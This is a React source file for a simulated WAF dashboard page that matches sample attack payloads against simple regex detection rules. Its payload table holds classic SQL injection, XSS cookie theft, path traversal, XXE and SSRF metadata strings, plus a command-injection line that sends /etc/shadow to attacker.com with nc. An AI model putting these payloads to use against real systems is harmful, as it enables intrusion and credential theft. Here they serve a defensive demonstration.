// PATH: client/src/app/(dashboard)/simulate/page.tsx
'use client'
import { useState } from 'react'
import type { SimAttackType, SimResult } from '@/types'

const SIM_RULES: Record<SimAttackType, { name: string; conf: number; patterns: RegExp[] }> = {
    sqli: { name: 'SQL Injection (OWASP A03)', conf: 97, patterns: [/'|--|;|union|select|drop|insert|delete|exec/i] },
    xss: { name: 'Cross-Site Scripting (A03)', conf: 93, patterns: [/<script|onerror|onload|javascript:|alert\(/i] },
    path: { name: 'Path Traversal (A05)', conf: 91, patterns: [/\.\.[/\\]|etc\/passwd|win\.ini/i] },
    cmd: { name: 'Command Injection (A03)', conf: 96, patterns: [/;|\|&|`|\$\(|nc |wget |curl /i] },
    csrf: { name: 'CSRF Attack (A01)', conf: 78, patterns: [/csrf|xsrf|forged/i] },
    xxe: { name: 'XXE Injection (A05)', conf: 90, patterns: [/<!entity|system\s*"|doctype/i] },
    ssrf: { name: 'SSRF (A10)', conf: 94, patterns: [/169\.254\.|10\.|192\.168\.|localhost|metadata/i] },
    brute: { name: 'Brute Force (A07)', conf: 88, patterns: [/admin|root|password|123|qwerty/i] },
}

const PAYLOADS: Record<SimAttackType, string> = {
    sqli: "'; DROP TABLE users; --",
    xss: '<script>alert(document.cookie)</script>',
    path: '../../etc/passwd',
    cmd: '; cat /etc/shadow | nc attacker.com 4444',
    csrf: "<form action='/transfer' method='POST'>...",
    xxe: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ssrf: 'http://169.254.169.254/latest/meta-data/',
    brute: 'admin / password123',
}

const LABELS: Record<SimAttackType, string> = {
    sqli: 'SQL Injection (A03)',
    xss: 'Cross-Site Scripting (A03)',
    path: 'Path Traversal (A05)',
    cmd: 'Command Injection (A03)',
    csrf: 'CSRF (A01)',
    xxe: 'XXE Injection (A05)',
    ssrf: 'SSRF (A10)',
    brute: 'Brute Force (A07)',
}

const panel: React.CSSProperties = { background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 10, overflow: 'hidden' }
const panelHeader: React.CSSProperties = { padding: '13px 16px', borderBottom: '1px solid var(--border)' }
const panelTitle: React.CSSProperties = { fontSize: 12.5, fontWeight: 600, color: '#cbd5e1' }
const label: React.CSSProperties = { fontSize: 10, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500, marginBottom: 6, display: 'block' }
const formGroup: React.CSSProperties = { marginBottom: 14 }

function DetailRow({ k, v, vStyle }: { k: string; v: string; vStyle?: React.CSSProperties }) {
    return (
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 12, padding: '6px 0', borderBottom: '1px solid rgba(30,42,56,.6)' }}>
            <span style={{ fontSize: 11.5, color: 'var(--text3)', flexShrink: 0 }}>{k}</span>
            <span style={{ fontSize: 11.5, color: 'var(--text2)', textAlign: 'right', ...vStyle }}>{v}</span>
        </div>
    )
}

export default function SimulatePage() {
    const [type, setType] = useState<SimAttackType>('sqli')
    const [endpoint, setEndpoint] = useState('/api/login')
    const [payload, setPayload] = useState(PAYLOADS['sqli'])
    const [result, setResult] = useState<SimResult | null>(null)
    const [loading, setLoading] = useState(false)

    const loadPayload = (t: SimAttackType) => { setType(t); setPayload(PAYLOADS[t]); setResult(null) }

    const simulate = () => {
        if (!payload.trim()) return
        setLoading(true); setResult(null)
        setTimeout(() => {
            const sig = SIM_RULES[type]
            const detected = sig.patterns.some(p => p.test(payload))
            const conf = detected ? sig.conf : Math.floor(Math.random() * 15) + 2
            const risk = detected ? Math.round(conf * 0.98) : Math.floor(Math.random() * 15) + 2
            setResult({
                detected,
                attackType: LABELS[type],
                endpoint: `POST ${endpoint}`,
                method: 'POST',
                payload,
                riskScore: risk,
                confidence: conf,
                rulesTriggered: [
                    { name: sig.name, match: detected },
                    { name: 'Signature DB v4.1', match: detected },
                    { name: 'Anomaly Score Threshold (80)', match: detected && conf > 80 },
                ],
            })
            setLoading(false)
        }, 700)
    }

    return (
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14, alignItems: 'start' }}
            className="sim-grid">
            <style>{`@media(max-width:768px){.sim-grid{grid-template-columns:1fr!important}}`}</style>

            {/* ── Left: Config ── */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>

                <div style={panel}>
                    <div style={panelHeader}><span style={panelTitle}>Attack Configuration</span></div>
                    <div style={{ padding: 16 }}>

                        <div style={formGroup}>
                            <span style={label}>Attack Type (OWASP)</span>
                            <select className="inp" style={{ width: '100%' }} value={type} onChange={e => loadPayload(e.target.value as SimAttackType)}>
                                {(Object.keys(LABELS) as SimAttackType[]).map(k => <option key={k} value={k}>{LABELS[k]}</option>)}
                            </select>
                        </div>

                        <div style={formGroup}>
                            <span style={label}>Target Endpoint</span>
                            <input className="inp" style={{ width: '100%' }} value={endpoint} onChange={e => setEndpoint(e.target.value)} />
                        </div>

                        <div style={formGroup}>
                            <span style={label}>Payload</span>
                            <textarea
                                rows={5}
                                style={{
                                    width: '100%', background: 'var(--bg3)', border: '1px solid var(--border)',
                                    borderRadius: 7, padding: '9px 12px', fontSize: 12,
                                    fontFamily: 'JetBrains Mono, monospace', color: '#fca5a5',
                                    resize: 'vertical', outline: 'none', transition: 'border-color .15s', boxSizing: 'border-box',
                                }}
                                value={payload}
                                onChange={e => setPayload(e.target.value)}
                                onFocus={e => (e.target.style.borderColor = 'var(--blue)')}
                                onBlur={e => (e.target.style.borderColor = 'var(--border)')}
                            />
                        </div>

                        <button
                            className="btn btn-primary"
                            style={{ width: '100%', justifyContent: 'center', padding: '10px 0', fontSize: 13, fontWeight: 600 }}
                            onClick={simulate}
                            disabled={loading}
                        >
                            {loading ? 'Analyzing…' : '⚡ Run Simulation'}
                        </button>
                    </div>
                </div>

                {/* Quick payloads */}
                <div style={panel}>
                    <div style={panelHeader}><span style={panelTitle}>Quick Payloads</span></div>
                    <div style={{ padding: '8px 0' }}>
                        {(Object.keys(LABELS) as SimAttackType[]).map(k => (
                            <button
                                key={k}
                                onClick={() => loadPayload(k)}
                                style={{
                                    display: 'block', width: '100%', textAlign: 'left',
                                    padding: '8px 16px', border: 'none', cursor: 'pointer',
                                    fontSize: 12.5, fontFamily: 'inherit', transition: 'all .12s',
                                    background: type === k ? 'var(--blue-dim)' : 'transparent',
                                    color: type === k ? '#60a5fa' : 'var(--text3)',
                                }}
                                onMouseEnter={e => { if (type !== k) { (e.currentTarget.style.background = 'rgba(255,255,255,.03)'); (e.currentTarget.style.color = 'var(--text2)') } }}
                                onMouseLeave={e => { if (type !== k) { (e.currentTarget.style.background = 'transparent'); (e.currentTarget.style.color = 'var(--text3)') } }}
                            >
                                {LABELS[k]}
                            </button>
                        ))}
                    </div>
                </div>
            </div>

            {/* ── Right: Result ── */}
            <div style={panel}>
                <div style={panelHeader}><span style={panelTitle}>WAF Analysis Result</span></div>
                <div style={{ padding: 16, minHeight: 300 }}>

                    {!result && !loading && (
                        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '60px 0', gap: 12, color: 'var(--text3)' }}>
                            <span style={{ fontSize: 32, opacity: .2 }}>⚡</span>
                            <span style={{ fontSize: 12.5 }}>Configure and run a simulation to see results</span>
                        </div>
                    )}

                    {loading && (
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '60px 0', gap: 10, color: 'var(--text3)', fontSize: 12.5 }}>
                            <div style={{ width: 16, height: 16, border: '2px solid var(--border2)', borderTopColor: 'var(--blue)', borderRadius: '50%', animation: 'spin .7s linear infinite' }} />
                            Analyzing payload…
                            <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
                        </div>
                    )}

                    {result && (
                        <div style={{ display: 'flex', flexDirection: 'column', gap: 16, animation: 'fadein .18s ease' }}>

                            {/* Verdict banner */}
                            <div style={{
                                padding: '14px 16px', borderRadius: 8,
                                background: result.detected ? 'rgba(239,68,68,.08)' : 'rgba(34,197,94,.08)',
                                border: `1px solid ${result.detected ? 'rgba(239,68,68,.2)' : 'rgba(34,197,94,.2)'}`,
                            }}>
                                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
                                    <span style={{ fontSize: 8, width: 8, height: 8, borderRadius: '50%', background: result.detected ? 'var(--red)' : 'var(--green)', display: 'inline-block', flexShrink: 0 }} />
                                    <span style={{ fontSize: 13, fontWeight: 700, letterSpacing: '.5px', color: result.detected ? '#fca5a5' : '#4ade80', textTransform: 'uppercase' as const }}>
                                        {result.detected ? 'Attack Blocked' : 'Request Allowed'}
                                    </span>
                                </div>
                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 24px', marginBottom: 12 }}>
                                    <div>
                                        <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500 }}>Attack Type</div>
                                        <div style={{ fontSize: 12.5, color: 'var(--text)', fontWeight: 500, marginTop: 2 }}>{result.attackType}</div>
                                    </div>
                                    <div>
                                        <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500 }}>Target</div>
                                        <div style={{ fontSize: 12.5, color: '#60a5fa', fontWeight: 500, marginTop: 2 }}>{endpoint}</div>
                                    </div>
                                </div>
                                <div>
                                    <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase' as const, letterSpacing: '.7px', fontWeight: 500, marginBottom: 6 }}>Confidence</div>
                                    <div style={{ height: 4, background: 'var(--border)', borderRadius: 2, overflow: 'hidden', marginBottom: 5 }}>
                                        <div style={{ height: '100%', width: `${result.confidence}%`, background: result.detected ? 'var(--red)' : 'var(--green)', borderRadius: 2, transition: 'width .5s' }} />
                                    </div>
                                    <span style={{ fontSize: 11.5, color: result.detected ? '#fca5a5' : '#4ade80', fontWeight: 500 }}>
                                        {result.confidence}% — {result.detected ? 'High Confidence' : 'Low Risk'}
                                    </span>
                                </div>
                            </div>

                            {/* Rules triggered */}
                            <div>
                                <div style={{ fontSize: 9.5, color: 'var(--text3)', textTransform: 'uppercase', letterSpacing: '.7px', fontWeight: 500, marginBottom: 10 }}>
                                    Rules Triggered ({result.rulesTriggered.filter(r => r.match).length})
                                </div>
                                <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                                    {result.rulesTriggered.map(r => (
                                        <div key={r.name} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '7px 0', borderBottom: '1px solid rgba(30,42,56,.6)', fontSize: 12.5 }}>
                                            <span style={{ color: r.match ? 'var(--red)' : 'var(--green)', fontSize: 13, flexShrink: 0, fontWeight: 600 }}>{r.match ? '✕' : '✓'}</span>
                                            <span style={{ color: 'var(--text2)', flex: 1 }}>{r.name}</span>
                                        </div>
                                    ))}
                                </div>
                            </div>

                            {result.detected && (
                                <div style={{ fontSize: 11, color: 'var(--text4)', textAlign: 'center', padding: '12px 16px', background: 'var(--bg3)', borderRadius: 7 }}>
                                    Request logged · IP flagged · Zero traffic passed to origin
                                </div>
                            )}
                        </div>
                    )}
                </div>
            </div>

        </div>
    )
}